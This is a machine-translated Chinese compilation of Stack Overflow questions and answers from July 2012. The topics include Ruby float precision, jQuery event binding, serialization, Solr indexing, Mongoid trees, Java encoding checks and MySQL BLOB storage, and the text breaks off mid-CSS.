# StackOverflow 问答 11309000-11309999

# ruby - irb 浮动实现

> ID：11309003
> 
> 赞同：0
> 
> 时间：2012-07-03T10:28:50.777
> 
> 标签：ruby, floating-point, irb

只是出于好奇问这个。

我正在使用**irb**终端并试图从浮点数中减去浮点数。

我发现

```
irb(main):003:0> 49.4 - 0.1 
```

给我

```
=> 49.3 
```

但如果我这样做

```
irb(main):003:0> 49.3 - 0.1 
```

然后我得到

```
=> 49.199999999999996 
```

**如果irb**，这与实施有关吗？我的意思是为什么 49.3 - 0.1 给出了这样的表示。（这是 49.3 - 0.1 特有的，我从来没有得到过这个）

我使用**irb 0.9.6**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T10:39:47.730

你应该阅读[每个计算机科学家应该知道的关于浮点运算的知识](http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html)。这与 Ruby 或 IRB 无关。

# javascript - Jquery 从动态内容中获取价值

> ID：11309006
> 
> 赞同：0
> 
> 时间：2012-07-03T10:28:56.340
> 
> 标签：javascript, jquery, ajax

我有一个页面，下面有一个下拉菜单和一个 div。根据您从菜单中选择的内容，这决定了 div 中加载的内容。我需要 div 中动态调用的内容才能知道选择了哪个菜单值。它还需要能够检索在加载动态内容时可以更改的其他下拉菜单值。

一旦从动态内容区域内单击提交按钮，所有这些值都需要被抓取。我正在尝试使用 jquery 中的 .parent() ，但我有一种行不通的感觉，因为我还不能让它工作。

任何有关如何从外部动态加载的内容中获取输入字段值的建议和帮助将不胜感激。

这是主页上的 Jquery 和 Html：

```
<script>
$(document).ready(function() {

    $("#men2link").click(function(){
         $.ajax({ url: 'pages/abc.php', success: function(html) {
            $("#subajax-content").empty().append(html);
            }
        });
    });
});
</script>

<table>
    <tr>
      <td>
            <table>
                <tr>
                    <td>Menu 1:</td>
                    <td>
                        <select name="men1" id="men1">
                            <option>Select Option</option>
                            <option value="o1">option1</option>
                            <option value="o2">option2</option>
                            <option value="o3">option3</option>
                        </select>
                    </td>
                </tr>
                <tr>
                    <td id="men2link">Menu 2</td>
                    <td>        
                        <select name="men2" id="men2">
                            <option>Select Option</option>
                            <option value="r">Received</option>
                            <option value="nr">Not Received</option>
                            <option value="na">Not Applicable</option>
                        </select>
                    </td>
                </tr>
            </table>
      </td>
      <td class="align-top"><div id="subajax-content"></div></td>
    </tr>
</table> 
```

动态加载到 subajax-content div 中的 Html 和 JQuery

```
<script>
$(document).ready(function() {
    $("#save").click(function(){
       alert($("#home").parent("#men2").val());
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:33:38.280

您可以使用“closest()”而不是 parent()，因为它不是那么严格

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:23:15.540

首先，使外部表可识别。对于唯一的表，您可以使用 id 或重复表，使用类：

```
<table id="outerTable">
<!-- or -->
<table class="outerTable"> 
```

现在你只需要一个 jQuery 块。这将响应动态插入的内容，因此无需再提供任何带有内容的 javascript/jQuery。

```
$(document).ready(function() {

    //This part is unchanged
    $("#men2link").click(function() {
        $.ajax({
            url: 'pages/abc.php', 
            success: function(html) {
                $("#subajax-content").empty().append(html);
            }
        });
    });

    //This part is a modified version of what was previously delivered with the dynamic content
    //For use with id="outerTable"
    $("#outerTable").on('click', "#save", function() {
        var $outerTable = $(this).closest(".outerTable"),
            val1 = $outerTable.find("#men1").val(),
            val2 = $outerTable.find("#men2").val();
        alert([val1, val2]);
    });
}); 
```

笔记：

*   重复外部表的代码将略有不同，每个外部表都有自己的内部表。
*   对于在唯一的外部表中重复内部表，代码将略有不同。
*   对于重复外部表或重复内部表，选择菜单和保存按钮也应该有类而不是 id。

# php - 访问数组中的对象数据

> ID：11309009
> 
> 赞同：0
> 
> 时间：2012-07-03T10:29:10.597
> 
> 标签：php, arrays, meta-search

如果有人对如何解决这个问题有一些帮助/建议，我会非常感激。我创建了一个元搜索引擎，它可以用于所有密集目的，但我的代码很容易破解！以下代码是对象数组的示例 var_dump - searchEngineArray。我想将每个搜索引擎的结果存储在一个数组中，但它需要在某种通用循环中（A）。如果一个搜索引擎不返回结果和 (B)，则不会中断。可以轻松容纳其他搜索引擎。

```
object(BingSearch)[1]
  private 'formatted_query' => string 'england' (length=7)
  public 'search_results' => 
    array
      0 => 
        array
          'title' => string 'England - Wikipedia, the free encyclopedia' (length=42)
          'url' => string 'http://en.wikipedia.org/wiki/England' (length=36)
          'score' => int 30
      1 => 
        array
          'title' => string 'BBC News - England' (length=18)
          'url' => string 'http://www.bbc.co.uk/news/england/' (length=34)
          'score' => int 28
      2 => 
        array
          'title' => string 'The FA - The website for the English football association, The FA ...' (length=69)
          'url' => string 'http://www.thefa.com/' (length=21)
          'score' => int 26

object(BlekkoSearch)[2]
  private 'formatted_query' => string 'england' (length=7)
  public 'search_results' => 
    array
      0 => 
        array
          'title' => string '<strong>England</strong> - Wikipedia' (length=36)
          'url' => string 'http://en.wikipedia.org/wiki/England' (length=36)
          'score' => int 25
      1 => 
        array
          'title' => string 'The official site of Visit <strong>England</strong> - The <strong>England</strong> Tourist Board' (length=96)
          'url' => string 'http://www.enjoyengland.com/' (length=28)
          'score' => int 23
      2 => 
        array
          'title' => string 'Arts Council <strong>England</strong> - Arts Council' (length=52)
          'url' => string 'http://www.artscouncil.org.uk/' (length=30)
          'score' => int 21

object(EntirewebSearch)[3]
  private 'formatted_query' => string 'england' (length=7)
  public 'search_results' => 
    array
      0 => 
        array
          'title' => string 'Arts Council England | Arts Council' (length=35)
          'url' => string 'http://www.artscouncil.org.uk/' (length=30)
          'score' => int 20
      1 => 
        array
          'title' => string 'Sport England ' (length=14)
          'url' => string 'http://www.sportengland.org/' (length=28)
          'score' => int 18
      2 => 
        array
          'title' => string 'Bank of England ' (length=16)
          'url' => string 'http://www.bankofengland.co.uk/' (length=31)
          'score' => int 16 
```

我让它在一定程度上工作，但它真的不是很好的代码。这是目前它的工作原理，有没有人对如何创建更通用的信息存储方式有任何想法？

```
public function storeResults($searchEnginesArray)
    {
        //The following is very bad
        //$blekko_Array = "";
        //$bing_Array = "";
        //$entireweb_Array = "";

        for($x=0; $x<sizeof($searchEnginesArray); $x++)
        {
            var_dump($searchEnginesArray[$x]);
            /*switch ($searchEnginesArray[$x]->getEngineName()) {
            case "Bing":
                $bing_Array = $searchEnginesArray[$x]->getResults();
                break;
            case "Blekko":
                $blekko_Array = $searchEnginesArray[$x]->getResults();
                break;
            case "Entireweb":
                $entireweb_Array = $searchEnginesArray[$x]->getResults();
                break;
            default:
                echo "Error: Unexpected Search Engine : ".$searchEnginesArray[$x]->getEngineName(). " Expects [Bing/Blekko/Entireweb]"; 
            } */
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:04:41.363

```
<?
public function storeResults($searchEnginesArray) {
    for($i=0;$i<count($searchEnginesArray);$i++) {
        $result = $searchEnginesArray[$i]->getResults();
        // Ignore engines with empty results
        if( !empty($result) ) {
            $results[ $searchEnginesArray[$i]->getEngineName() ] = $result;
        }
    }
    // create an array for every engine, are you sure it's needed?
    extract($results, EXTR_SKIP);
}
?> 
```

# c# - 没有 DataMember 属性的 DataContract 序列化

> ID：11309010
> 
> 赞同：2
> 
> 时间：2012-07-03T10:29:11.960
> 
> 标签：c#, wcf, linq-to-sql, serialization, datacontractserializer

我使用函数 FreezeAllAccountsForUser 生成了以下 XML。我只需要为此函数序列化以下两列。如何将序列化限制为两列？

1.  银行账户ID
2.  地位

注意：关键是做这个限制的**范围**应该只在函数FreezeAllAccountsForUser之内；**不是全球性**的。

参考

1.  [序列化包含派生类的 IEnumerable：循环引用问题](https://stackoverflow.com/questions/11308180/serializing-ienumerable-that-contains-derived-classes)

XML

```
 <ArrayOfBankAccount xmlns:i="http://www.w3.org/2001/XMLSchema-instance" z:Id="1" z:Size="1" 
                xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/" 
                xmlns="http://schemas.datacontract.org/2004/07/DBML_Project">

  <BankAccount z:Id="2" i:type="FixedBankAccount">

<AccountOwnerID>2</AccountOwnerID>
<AccountType z:Id="3">Fixed     </AccountType>
<BankAccountID>2</BankAccountID>

<BankUser z:Id="4">
  <BankAccounts z:Id="5" z:Size="1">
    <BankAccount z:Ref="2" i:nil="true" />
  </BankAccounts>
  <Name z:Id="6">TestP1    </Name>
  <UserID>2</UserID>
  <UserType z:Id="7">Ordinary  </UserType>
</BankUser>

<OpenedDate i:nil="true" />

<Status z:Id="8">FrozenFA</Status>

   </BankAccount>

</ArrayOfBankAccount> 
```

序列化

```
public class BankAccountAppService
{
    public RepositoryLayer.ILijosBankRepository AccountRepository { get; set; }

    public void FreezeAllAccountsForUser(int userId)
    {
        IEnumerable<DBML_Project.BankAccount> accounts = AccountRepository.GetAllAccountsForUser(userId);
        foreach (DBML_Project.BankAccount acc in accounts)
        {

            string typeResult = Convert.ToString(acc.GetType());
            string baseValue = Convert.ToString(typeof(DBML_Project.BankAccount));

            if (String.Equals(typeResult, baseValue))
            {
                throw new Exception("Not correct derived type");
            }

            acc.Freeze();
        }

        System.Xml.XmlDocument xmlDoc = new System.Xml.XmlDocument();
        System.Xml.XPath.XPathNavigator nav = xmlDoc.CreateNavigator();

        using (System.Xml.XmlWriter writer = nav.AppendChild())
        {
            System.Runtime.Serialization.DataContractSerializer serializer = new System.Runtime.Serialization.DataContractSerializer(typeof(List<DBML_Project.BankAccount>), null, int.MaxValue, false, true, null);
            serializer.WriteObject(writer, accounts);
        }

        xmlDoc.Save("C:\\DevTEST\\FileName.txt");

    }

} 
```

领域类

```
namespace DBML_Project
{
[KnownType(typeof(FixedBankAccount))]
[KnownType(typeof(SavingsBankAccount))]
public  partial class BankAccount
{
    //Define the domain behaviors
    public virtual void Freeze()
    {
        //Do nothing
    }
}

public class FixedBankAccount : BankAccount
{

    public override void Freeze()
    {
        this.Status = "FrozenFA";
    }
}

public class SavingsBankAccount : BankAccount
{

    public override void Freeze()
    {
        this.Status = "FrozenSB";
    }
}  
} 
```

LINQ to SQL 自动生成的类

```
[global::System.Data.Linq.Mapping.TableAttribute(Name="dbo.BankAccount")]
[InheritanceMapping(Code = "Fixed", Type = typeof(FixedBankAccount), IsDefault = true)]
[InheritanceMapping(Code = "Savings", Type = typeof(SavingsBankAccount))]
public partial class BankAccount : INotifyPropertyChanging, INotifyPropertyChanged 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-03T10:36:34.970

听到这将令人烦恼（我知道您一直在两个序列化程序之间弹跳），但是：`XmlSerializer` *确实*支持这一点，有两种方式：a）通过`XmlAttributeOverrides`在运行时指定属性，b）通过“条件序列化”（`public bool ShouldSerializeFoo()`对于 member `Foo`）。`DataContractSerializer`都不支持这些。不同的序列化器：不同的功能。

我的建议：停止尝试将序列化融入您的域模型。这*可以*工作，但是当它变得混乱时**停止战斗**，并创建一个简单的单独 DTO 模型，设计为*作为主要目的*进行序列化，并根据需要在域模型和 DTO 模型之间进行映射。

# php - Apache solr 在字段中附加数据

> ID：11309012
> 
> 赞同：0
> 
> 时间：2012-07-03T10:29:15.320
> 
> 标签：php, curl, solr

我正在使用 curl 中的此命令在 Apache solr 中索引我的数据

```
curl "http://localhost:8983/solr/update/extract?literal.id=doc1&uprefix=attr_&fmap.content=attr_content&commit=true" -F "myfile=@/home/ww.pdf" 
```

运行此命令后，我可以向 attr_contents 属性添加更多内容吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:23:04.640

就地更新（仅更改现有记录的一个字段）在当前版本的 Solr 中是不可能的。您将需要重新索引整个文档。

但是，如果要在索引富文档（如 PDF）时设置字段，请使用`literal.my_field=some_val`. 您正在`id`包含的命令中设置这种方式。

# c# - jquery在异步回发后不起作用

> ID：11309017
> 
> 赞同：4
> 
> 时间：2012-07-03T10:29:31.550
> 
> 标签：c#, jquery, asp.net, updatepanel

我正在使用更新面板进行异步回发。在异步回发 jQuery 功能不起作用之后。我正在使用 jQuery 对 UpdatePanel 内的 html 表格单元格连接一些 mousedown mouseenter 效果。事件绑定在 $(document).ready

```
 <script type="text/javascript">

                $(function ()

     {
    $(".csstablelisttd").mousedown(function (e)
                        {
    //mouse down code
    });
 $(".csstablelisttd").mouseenter(function (e)
                        {
    //mouse entercode
    });
                        $("#contentPlaceHolderMain_btnFix").click(function (e)
                        {alert("Alert");//here alert is generate two times an then postback occurs
                           //btn click code
                        }
                    }

            </script>

    <asp:UpdatePanel ID="updatePanelTableAppointment" runat="server">
                            <ContentTemplate>
         <table id="table" runat="server">
             //table data
            </table>

                        </ContentTemplate><Triggers>
                            <asp:AsyncPostBackTrigger ControlID="btnFix" EventName="Click" />
                        </Triggers>
                    </asp:UpdatePanel> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:33:09.653

`asp:UpdatePanel`用服务器返回的结果替换内容。这意味着以前的所有挂钩事件在回发后都将不起作用。

改为使用[`jQuery.on()`](http://api.jquery.com/on/)。

例如：

```
<script type="text/javascript">
$(function () {

    $("#table").on("mousedown mouseenter", ".csstablelisttd", function (e) {
        //mouse down AND mouse enter code
    });

    $("#contentPlaceHolderMain_btnFix").on("click", function (e) {
        alert("Alert");//here alert is generate two times an then postback occurs
        //btn click code
    });
});
</script> 
```

*注意：如果您的鼠标按下和鼠标输入代码不同，请将它们分开。*

对包含在`UpdatePanel`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T10:35:05.113

您必须为 Toolkit 提供的 ajax endRequest 添加事件处理程序。[**在这里**](http://msdn.microsoft.com/en-us/library/bb383810.aspx)阅读更多[](http://msdn.microsoft.com/en-us/library/bb383810.aspx)

 ****添加在页面加载时执行的 Javascript 块。**

```
Sys.WebForms.PageRequestManager.getInstance().add_endRequest(endRequestHandle);

function endRequestHandle(sender, Args)
{
     alert("After ajax call");
} 
```**

# ios - iPad 投影仪人像模式

> ID：11309018
> 
> 赞同：0
> 
> 时间：2012-07-03T10:29:32.573
> 
> 标签：ios, ipad, projector

我想展示一款只能通过投影仪在纵向模式下玩的 iPad 游戏。我没有 VGA 适配器，所以我无法尝试（但大学有，所以在演示日我会有一个）。所以我的问题是：是否可以让投影仪以纵向模式显示 iPad？谢谢，祝你有美好的一天。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:30:51.057

它会模仿 iPad 当前的方向，所以如果您的方向是纵向的，那么投影仪将显示纵向。

# ruby-on-rails - Mongoid "acts-as-tree" vs. "recursively_embeds_many" vs. "mongoid-tree"

> ID：11309023
> 
> 赞同：3
> 
> 时间：2012-07-03T10:30:01.327
> 
> 标签：ruby-on-rails, ruby, tree, mongoid

I am quite new to mongoid and rails. So I have some troubles to get an tree structure working:

I found three "solutions" to build

mongoid-tree (which is the most actual one) [https://github.com/benedikt/mongoid-tree](https://github.com/benedikt/mongoid-tree)

and the mongoid provided solution recursively_embeds_more

mongoid_acts_as_tree [https://github.com/saks/mongoid_acts_as_tree](https://github.com/saks/mongoid_acts_as_tree)

my goal is to make a tree for musicstyles which can be referenced/embedded in different models.

*   -House
*   ---Tech House
*   ---Minimal House
*   -Folk
*   ---African
*   ---Asian
*   -Metal
*   ---Heavy Metal
*   ---Death Metal
*   .....

My Model looks now like this:

```
class Musicstyle
  include Mongoid::Document
  include Mongoid::Timestamps

  include Mongoid::Tree # mongoid-tree Version
  recursively_embeds_many # mongoids version itself

  field :musicstyle, type: String
  field :description, type: String
  field :parent
end 
```

and the view

```
<div class="field">
    <%= f.label :parent %>
    <%= f.select :parent,
                 Musicstyle.all.map { |m| [m.musicstyle, m._id] },
                 {:include_blank => "Select a parent (if needed)"} %>
</div> 
```

I searched now for hours for an working example, without success.

Maybe someone can offer me some lines of code for a better understanding

any help will make my day

many, many thanks in advance

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-04T06:49:35.607

You can't use `mongoid-tree` and `recursively_embeds_many` together. You'll have to choose between a tree using references (`mongoid-tree`) or an embedded tree (`recursively_embeds_many`). If you want to embed the tree in other models I'd recommend the latter. If you want to reference music styles from other models (for example use them as categories and make them have many different artists) I'd recommend the `mongoid-tree` approach. In both cases you won't need the `parent` field.

So your example using `mongoid-tree` could look like this:

```
class Musicstyle
  include Mongoid::Document
  include Mongoid::Timestamps
  include Mongoid::Tree

  field :musicstyle, type: String
  field :description, type: String
end

# Usage example
musicstyle = Musicstyle.find(...)
musicstyle.children # This music style's children
musicstyle.parent   # This music style's parent 
```

and your example using just `recursively_embeds_many` could look like this:

```
class Musicstyle
  include Mongoid::Document
  include Mongoid::Timestamps
  recursively_embeds_many

  field :musicstyle, type: String
  field :description, type: String
end

# Usage example
musicstyle = Musicstyle.find(...)
musicstyle.child_musicstyles # This music style's children
musicstyle.children.first.parent_musicstyle # The first child's parent (as you can't use find to get an embedded music style) 
```

Bests,

Benedikt

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-04T14:35:34.330

I had posted my solution here:

[https://groups.google.com/forum/?fromgroups#!topic/mongoid/iF39R_hwc_o](https://groups.google.com/forum/?fromgroups#!topic/mongoid/iF39R_hwc_o)

MODEL

```
class Musicstyle
  include Mongoid::Document
 field :title, type: String
  recursively_embeds_many
end 
```

CONTROLLER

```
def new
    @musicstyle = Musicstyle.new
    @all_musicstyles = Musicstyle.all
end
def create
    if params[:musicstyle][:parent_musicstyle]
       parent = Musicstyle.find(params[:musicstyle].delete(:parent_musicstyle))
       parent.child_musicstyles.create(params[:musicstyle])
    end
    @musicstyle = Musicstyle.new(params[:musicstyle])
end 
```

VIEW

```
 <% if @all_musicstyles %>
        <div class="field">
            <%= f.label :parent_musicstyle %>
            <%= f.collection_select( :parent_musicstyle, @all_musicstyles, :_id, :title) %>
        </div>
   <% end %> 
```

Results:

```
- House
-- Ibiza House
- Ibiza House
-- Child Progressive House
- Progressive House 
```

# php - Flow3 调试

> ID：11309024
> 
> 赞同：2
> 
> 时间：2012-07-03T10:30:09.570
> 
> 标签：php, aop, typo3-flow

我目前正在为即将到来的项目评估 Flow3。AOP 模式和依赖注入将非常适合我们的目的。

现在我想不通的是如何在控制器动作中调试一些结果。

```
public function testAction() {
    $beans = $this->coffeeBeanRepository->findAll();
    var_dump($beans); // doesn't work, browser crashes
} 
```

我试过的：

*   使用 PHPStorm 和 XDEBUG 进行调试（这是我通常的做法）
*   var_dump / print_r / 打印

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T16:47:34.377

您想使用 FLOW3 的 var_dump，它处理来自深度嵌套对象的一些递归并导致浏览器缓存：

\TYPO3\FLOW3\var_dump()

XDebug 在 FLOW3 中可能很棘手，因为 FLOW3 为您的类创建代理类以使所有 AOP 魔术发生。尽管如此，我知道这里的开发人员在他们的 FLOW3 项目中成功地在 PHPStorm 中使用了 xdebug_break()，所以这绝对是可行的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-14T03:11:11.643

Xdebug 不是那么棘手，你缓存的 PHP 文件必须用于调试目的，如果你需要调试 MyController，在缓存目录中搜索一个 MyController_Original 并将你的断点放在这个文件中。

您还可以使用 debugproxy.php 来改进 xDebug with Flow 的使用： [https ://github.com/sandstorm/debugproxy](https://github.com/sandstorm/debugproxy)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-18T16:26:37.503

在最新版本的 Typo3 Flow 中，您必须使用：

```
\TYPO3\Flow\var_dump('test'); 
```

# java - 检查字符串是否包含编码字符

> ID：11309026
> 
> 赞同：4
> 
> 时间：2012-07-03T10:30:11.950
> 
> 标签：java, encoding, utf-8, character-encoding

您好我正在寻找一种方法来检测字符串是否已被编码

例如

```
 String name = "Hellä world";
    String encoded = new String(name.getBytes("utf-8"), "iso8859-1"); 
```

这个`encoded`变量的输出是：

```
HellÃ¤ world 
```

如您所见，有一个带有坟墓和另一个符号的 A。有没有办法检查输出是否包含编码字符？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-03T12:14:49.770

听起来您想检查从 latin1 中的字节解码的字符串是否也可以在 UTF-8 中解码。这很容易，因为非法字节序列被字符 \ufffd 替换：

```
String recoded = new String(encoded.getBytes("iso-8859-1"), "UTF-8");
return recoded.indexOf('\uFFFD') == -1; // No replacement character found 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-03T10:39:09.320

你的问题没有意义。java`String`是一个字符列表。在您将它们转换为字节之前，它们没有编码，此时您需要指定一个（尽管您会看到很多使用平台默认值的代码，例如`String.getBytes()`没有参数的情况）。

我建议您阅读此[http://kunststube.net/encoding/](http://kunststube.net/encoding/)。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-07-03T10:39:34.087

```
String name = "Hellä world";
String encoded = new String(name.getBytes("utf-8"), "iso8859-1"); 
```

此代码只是一个字符损坏错误。您获取一个 UTF-16 字符串，将其转码为 UTF-8，假装它是 ISO-8859-1 并将其转码回 UTF-16，从而导致编码错误的字符。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-07-03T11:11:23.293

如果我正确理解了您的问题，此代码可能会对您有所帮助。函数 isEncoded 检查其参数是否可以编码为 ascii 或是否包含非 ascii 字符。

```
public boolean isEncoded(String text){

    Charset charset = Charset.forName("US-ASCII");
    String checked=new String(text.getBytes(charset),charset);
    return !checked.equals(text);

}

@Test
public void testAscii() throws Exception{
    Assert.assertFalse(isEncoded("Hello world"));
}

@Test
public void testNonAscii() throws Exception{
    Assert.assertTrue(isEncoded("Hellä world"));
} 
```

您还可以检查其他字符集更改字符集 var 或将其移动到参数。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-07-03T10:44:22.110

我不确定您要做什么或您的问题是什么。

这行没有任何意义：

```
String encoded = new String(name.getBytes("utf-8"), "iso8859-1"); 
```

您正在将您的编码`name`为“UTF-8”，然后尝试解码为“iso8859-1”。

如果您要将您的编码`name`为“iso8859-1”，请执行`name.getBytes("iso8859-1")`.

请告诉我们您遇到的问题，以便我们提供更多帮助。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-03T10:50:21.643

您可以通过此代码检查您的字符串是否已编码

```
public boolean isEncoded(String input) {

    char[] charArray = input.toCharArray();
    for (int i = 0, charArrayLength = charArray.length; i < charArrayLength; i++) {
        Character c = charArray[i];
        if (Character.getType(c) == Character.OTHER_LETTER)){
            return true;
        }
    }
    return false;
} 
```

# asp.net-mvc-3 - Telerik ASP.NET MVC 3 Grid - 设置行背景

> ID：11309028
> 
> 赞同：4
> 
> 时间：2012-07-03T10:30:21.447
> 
> 标签：asp.net-mvc-3, telerik, telerik-mvc

我正在使用 Telerik Grid。我需要根据视图模型中的某些属性为整行设置背景颜色。我试图通过在 IF 语句中为每一列设置背景来做到这一点，但背景仅适用于元素而不是所有单元格 (td)。此外，完成这项任务似乎是一种非常“肮脏”的方式。

```
@(Html.Telerik().Grid(Model.SomeItems).Name("Grid")
               .Columns(columns =>
               {
                   columns.Template(
                       @<text>
                          @if (Model.IsOfSpecialColor)
                           {
                             <div class="gridRowBackground">
                               @Html.ActionLink(...)
                             </div>
                           }
                           else
                           {                                        
                              @Html.ActionLink(...)
                           }
                      </text>).Title("Blabla");
                }); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-03T12:46:41.507

您可以使用`onRowDataBound`事件更改它

```
@(Html.Telerik().Grid<Customer>()
      .Name("Grid2")
      .DataBinding(d => d.Ajax().Select("Select", "Home"))
      .ClientEvents(e => e.OnRowDataBound("onRowDataBound"))
) 
```

函数是

```
<script>
function onRowDataBound(e) {
    if (e.dataItem.ID == 2) {
        e.row.style.backgroundColor = "grey";
    }
}
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T13:27:00.203

如果您使用服务器数据绑定，则可以使用 CellAction。但是，如果您使用 ajax 数据绑定，则需要使用 Tassadaque 建议的解决方案。

```
@(Html.Telerik().Grid(Model.SomeItems)
.Name("Grid")
.CellAction(cell =>
{
    if (cell.DataItem.IsOfSpecialColor.Value)
    {
      cell.HtmlAttributes["style"] = "background-color: red";
    }
}) 
```

# iphone - 可以使用非官方的 Airplay 协议吗？

> ID：11309031
> 
> 赞同：2
> 
> 时间：2012-07-03T10:30:31.690
> 
> 标签：iphone, airplay

我在寻找实现 Airplay 的方法时遇到了这个链接 [http://nto.github.com/AirPlay.html 。](http://nto.github.com/AirPlay.html)我没有苹果电视，所以我正在使用 Airserver 进行测试。我可以通过非官方协议实现图像共享。我的问题是，如果我向 iTunes 提出这样的应用程序，它会被接受吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:43:09.560

最近，许多 airplay hack 应用程序已从 AppStore 中删除：

[https://www.google.es/search?sourceid=chrome&ie=UTF-8&q=airplay+removed+appstore](https://www.google.es/search?sourceid=chrome&ie=UTF-8&q=airplay+removed+appstore)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:35:52.803

**如果**它是一个开源项目，那么应该没问题，否则 Apple 不允许私有协议 - 框架。

# opencart - opencart 多商店类别不显示

> ID：11309034
> 
> 赞同：0
> 
> 时间：2012-07-03T10:30:44.363
> 
> 标签：opencart

我安装了 opencart 1.5 mutlistore 在默认站点没有问题。

在第二个站点类别和产品中没有出现。解决办法是什么？

[yeni.dizayna.org](http://yeni.dizayna.org)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:47:35.660

要让类别显示在该商店中，您需要在类别编辑器页面的 DATA 选项卡中将类别分配给其他商店（不仅仅是默认）。请注意，您还需要将您拥有的产品也分配给其他商店（在产品编辑器的 LINKS 选项卡下）

# python - OpenERP：功能字段

> ID：11309039
> 
> 赞同：0
> 
> 时间：2012-07-03T10:30:56.730
> 
> 标签：python, openerp

我想使用以前的值计算函数字段的值（=具有以前id的记录的值）

```
'testrest' : fields.function(get_reste, method=True, string='Restant',type='integer'),

 def get_reste(self, cr, uid, ids, field_name, arg, context):
    x = {}
    for record in self.browse(cr, uid, ids ,context):
            if record.statut !=  'entree': 
                x[record.id]= a + record.entree_nbr # a should be the same field for the previous record 
```

我怎样才能做到这一点？谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:52:11.310

```
def get_reste(self, cr, uid, ids, field_name, arg, context):
    x = {}
    a = 0.0
    for record in self.browse(cr, uid, ids ,context):
            if record.statut !=  'entree': 
                x[record.id]= a + record.entree_nbr 
                a =record.testrest
    return x 
```

如果需要，您可以按以下方式对 id 列表进行排序`ids.sort()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:04:18.770

`OE 6.1+`关于and的第一点`fields.function()`：它不再需要`method`参数 [ Server rev 3495 revid odo@openerp.com-20110701232328-flgxulxva70vnyxr 和 addons rev 4844]。所以请不要再使用“method”参数了！

现在您想根据以前的值计算值，所以您可以做的是您可以`store=True`在这里使用参数，它将您以前的值存储在数据中，现在在您的计算中以供记录您可以读取以前的值并计算新值并返回它。

```
'testrest' : fields.function(get_reste, store=True, string='Restant',type='integer'),

 def get_reste(self, cr, uid, ids, field_name, arg, context):
    x = {}
    for record in self.browse(cr, uid, ids ,context):
            if record.statut !=  'entree': 
                x[record.id]= record.testrest + record.entree_nbr
    return x 
```

字符串的好处是您可以在 OE 之外的任何地方或某些外部报告工具中使用此值，您甚至可以使用此字段。

希望这会有所帮助。

更多代码：

```
'price': fields.function(_price_get, method=True, string="Price", store=True), 
```

# java - Mysql字节数组存储

> ID：11309040
> 
> 赞同：17
> 
> 时间：2012-07-03T10:30:57.727
> 
> 标签：java, mysql, jdbc, bytearray, binaryfiles

我有一个用 Java 创建的字节数组。它代表某个文件的内容。我不确切知道这个数组的最大大小。它可以是不同的尺寸。我想将它存储在mysql中。我应该在mysql中使用什么类型？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-07-03T10:46:52.367

使用[`BLOB`](http://dev.mysql.com/doc/refman/5.0/en/blob.html), `medium blob`,[`varbinary`](http://dev.mysql.com/doc/refman/5.0/en/binary-varbinary.html)

[Mysql 为列选择正确的类型](http://dev.mysql.com/doc/refman/5.0/en/choosing-types.html)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-03T10:34:14.053

用于[`varbinary`](http://dev.mysql.com/doc/refman/5.0/en/binary-varbinary.html)在 MySQL 中存储任意长度的字节数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:40:55.177

使用`blob`字段

[java 序列号](http://docs.oracle.com/javase/7/docs/api/javax/sql/rowset/serial/SerialBlob.html)

[mysql 块](http://dev.mysql.com/doc/refman/5.1/de/blob.html)

# html - 将位置设置为绝对位置时垂直显示的韩文文本 (HTML CSS)

> ID：11309042
> 
> 赞同：2
> 
> 时间：2012-07-03T10:30:59.287
> 
> 标签：html, css, position

这是一个奇怪的问题。我正在构建的网站上有登录屏幕，上面有一系列标志，可让您设置语言，当您将鼠标悬停在标志上时，它会在仅 CSS 的工具提示中显示语言的名称。

这很好用，除非语言是韩语或中文，文本垂直排列如下：

![工具提示](../Images/8f20d12ee3122fb7ea51d942642be3c7.png)

我不确定这是一个大问题，因为我认为这两种语言都可以垂直或水平阅读。但是我想知道它为什么会发生，事实上它发生在 IE9、IE7、Chrome 和 Firefox 中。所以我认为它可能是这样的。

**然而！**只有当位置设置为绝对时才会发生这种情况。这是我的 HTML：

```
<span class="tooltip">          
    <a href="/Login/Index?Language_Id=2">
        <img alt="한국의" class="Language_Flag" src="/Content/images/flags/kor.png" />  
    </a>                
    <span class="tip_basic">
        한국의
    </span>
</span> 
```

和CSS：

```
span.tooltip
{
position: relative;
}

span.tooltip .tip_basic
{
display: none;
position: absolute;

background-color: rgba(255, 255, 255, 0.7);
border: 3px solid #224E8B;
padding: 10px;
border-radius: 10px;

